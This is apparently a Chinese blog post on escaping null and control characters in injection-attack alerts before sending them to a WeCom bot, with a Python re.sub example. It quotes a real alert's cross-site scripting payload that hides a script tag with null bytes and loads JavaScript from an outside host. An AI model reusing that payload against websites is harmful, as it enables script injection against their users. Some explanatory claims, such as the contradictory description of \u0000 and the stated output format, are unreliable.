# 传参中的\u0000如何处理

在处理注入攻击告警的时候遇到一种类型的告警如下：

```
Referer
https://www.kujiale.com/decoproduct/model?8a07a2lk=0uivft21&query=ccccc\"><body/hidden>\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000<scrIpT/src=//m.goyto.com/js/xs.js><noscript>&type=hb
```

但是在将文本传递到企业微信机器人通知的时候因为Unicode编码中`\u0000`代表的是空字符，属于控制字符，也叫不可显字符。这个空字符与空格不同，空格的编号是 `\u0020`，`\u0000`就是一个包含一个字符的字符串，而`\u0000`是一个空字符串，这个字符串中一个字符也没有。

Unicode 标准描述了字符是如何用 **码位（code point）** 表示的。码位的取值范围是 0 到 0x10FFFF 的整数（大约 110 万个值，[实际分配的数字](https://www.unicode.org/versions/latest/#Summary) 没有那么多）。在 Unicode 标准和本文中，码位采用 `U+265E` 的形式，表示值为 `0x265e` 的字符（十进制为 9822）。

在内存中会用包含八个二进制位的字节来存储这个 Unicode 字符，将 Unicode 字符串翻译成字节序列的规则就是**字符编码**。

如果我们想要对这中特殊字符做处理，一种方式就是利用`re`模块里的`sub`对这些文本做替换

```python
def special_char_handler(m):
    matched_text = m.group(0)
    l = [
        '\u0000', # 字符串的终止符或作为数据流的结束标志
        '\u001F', # 单元分隔符，在文本处理中用于分隔数据字段
        '\u0080', # 旧版ASCII字符集中用于填充字节
        '\u009F', # 在ASCII字符集中用于发送特定命令给终端设备
        '\u000D', # 在文本中表示光标返回到当前行的开头
    ]
    if matched_text in l: # 如果判定 Unicode 字符是特殊的控制字符，则对该字符码点转换为4位十六进制表示形式的字符串
        matched_text = '\\\\u' + format(ord(matched_text), '04x')
    return matched_text


text = 'abc\u0000def'
text = re.sub(r'[\u0000-\uFFFF]', special_char_handler, text)

print(text)
```

当`sub()`的参数`repl`是一个函数的时候，每次匹配到的`Match`对象都会被传入这个函数中做处理，然后将返回值作为正真用于替换的字符串字面量

`format(ord(matched_text), '04x')` 是一个Python表达式，它的作用是将 `matched_text` 的Unicode码点转换为4位十六进制表示形式的字符串。

- `ord(matched_text)` 返回 `matched_text` 的Unicode码点。`ord()` 函数接受一个字符作为参数，并返回该字符对应的Unicode码点。
- `'04x'` 是格式化字符串，其中的 `'x'` 表示以十六进制形式输出，而 `'04'` 表示输出至少包含4个字符，并按需要使用零填充。

所以上面代码的返回结果就会是形如`\u000`的字符串。